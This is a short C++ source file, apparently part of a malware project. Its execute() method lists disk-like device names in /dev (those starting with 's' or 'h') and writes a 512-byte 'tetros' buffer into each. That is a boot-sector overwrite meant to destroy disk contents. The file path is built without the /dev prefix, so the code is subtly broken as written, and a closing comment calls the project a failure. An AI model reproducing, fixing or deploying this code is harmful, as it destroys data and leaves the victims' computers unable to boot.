#include "phase2.h"

phase2::phase2()
{

}

int phase2::execute()
{
	int secsToWait;
	DIR *dir;
	struct dirent *ent;
	if ((dir = opendir ("/dev")) != NULL) {
	  /* print all the files and directories within directory */
	  while ((ent = readdir (dir)) != NULL) {
 	   if(ent->d_name[0] == 's' || ent->d_name[0] == 'h')
	   {
	        printf ("%s\n", ent->d_name);
		FILE* fh = fopen(ent->d_name, "w");
		fwrite(*tetros, 1, 512, fh);
		fclose(fh);
	   }
 	 }
 	 closedir (dir);
	} else {
 	 /* could not open directory */
  	perror ("");
  	return EXIT_FAILURE;
	}

	secsToWait = 2;

	sleep(secsToWait);
	//this project was a failure.
	return 0;
}

